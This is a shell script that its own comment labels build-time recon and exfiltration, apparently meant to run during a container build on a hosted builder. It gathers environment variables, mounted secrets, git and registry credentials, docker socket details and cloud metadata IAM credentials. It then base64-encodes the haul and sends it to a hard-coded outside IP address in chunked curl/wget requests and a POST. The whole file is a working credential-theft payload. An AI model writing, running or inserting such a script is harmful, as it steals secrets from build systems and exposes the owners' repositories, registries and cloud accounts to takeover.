#!/bin/sh
# w12-app build-time recon/exfil (runs during `podman/docker build` on Aiven's builder)
B="http://169.58.237.50/w12build"
OUT=/tmp/w12o
{
  echo "== host: $(hostname)"
  echo "== id: $(id 2>&1)"
  echo "== uname: $(uname -a 2>&1)"
  echo "== cat_hostname: $(cat /etc/hostname 2>&1)"
  echo "== pwd: $(pwd 2>&1)"
  echo "== cmdline1: $(tr '\0' ' ' < /proc/1/cmdline 2>&1)"
  echo "== cap: $(grep -i cap /proc/self/status 2>&1 | tr '\n' '|')"
  echo "== lsroot: $(ls -la / 2>&1 | tr '\n' '|')"
  echo "== mounts: $(grep -Ev 'proc|sysfs|cgroup|devpts|mqueue|shm|tmpfs' /proc/mounts 2>&1 | tr '\n' '|')"
  echo "== env: $(env 2>&1 | tr '\n' '|')"
  echo "== secrets: $(ls -la /var/run/secrets /run/secrets /secrets 2>&1 | tr '\n' '|')"
  echo "== secretfiles: $(for f in /var/run/secrets/*/* /run/secrets/* /secrets/* /etc/registry-auth.env /etc/run.env; do echo \"--$f--\"; cat \"$f\" 2>/dev/null; done | tr '\n' '|')"
  echo "== gitconfig: $(cat /root/.gitconfig ~/.gitconfig /etc/gitconfig 2>&1 | tr '\n' '|')"
  echo "== gitcred: $(cat /root/.git-credentials ~/.git-credentials /etc/git-credentials 2>&1 | tr '\n' '|')"
  echo "== regcfg: $(cat /root/.docker/config.json ~/.docker/config.json /root/.config/containers/auth.json 2>&1 | tr '\n' '|')"
  echo "== gitauth: $(find / -xdev -name '.git-credentials' -o -xdev -name 'config.json' -path '*docker*' 2>/dev/null | head -20 | tr '\n' '|')"
  echo "== docker_sock: $(ls -la /var/run/docker.sock /run/docker.sock /run/podman/podman.sock 2>&1 | tr '\n' '|')"
  echo "== builddirs: $(ls -la /src /workspace /build /app /home /alloc 2>&1 | tr '\n' '|')"
  echo "== imds: $(wget -q -O- -T 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1 | tr '\n' '|')"
} > $OUT 2>&1
cat $OUT
b64=$(base64 -w0 $OUT 2>/dev/null | tr '+/' '-_')
i=0
while [ -n "$b64" ]; do
  chunk=$(printf '%s' "$b64" | cut -c1-380)
  b64=$(printf '%s' "$b64" | cut -c381-)
  curl -s -m 6 "$B/c$i-$chunk" >/dev/null 2>&1 || wget -q -O- -T 6 "$B/c$i-$chunk" >/dev/null 2>&1
  i=$((i+1))
  [ $i -gt 30 ] && break
done
head -c 4000 $OUT > /tmp/b; curl -s -m 6 --data-binary @/tmp/b "$B/postbody" >/dev/null 2>&1
exit 0
